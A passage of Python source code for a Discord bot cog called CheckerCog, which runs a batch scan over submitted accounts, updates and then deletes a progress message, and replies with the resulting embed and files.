            try:
                await progress_msg.edit(embed=embed)
            except Exception:
                pass

        role_ids = await self.get_member_role_ids(ctx)
        final_embed, files = await execute_batch_scan(
            bot=self.bot,
            raw_accounts=accounts,
            user_id=ctx.author.id,
            username=ctx.author.name,
            role_ids=role_ids,
            progress_edit_fn=edit_progress
        )

        try:
            await progress_msg.delete()
        except Exception:
            pass

        await ctx.reply(embed=final_embed, files=files)

async def setup(bot: commands.Bot):
    await bot.add_cog(CheckerCog(bot))
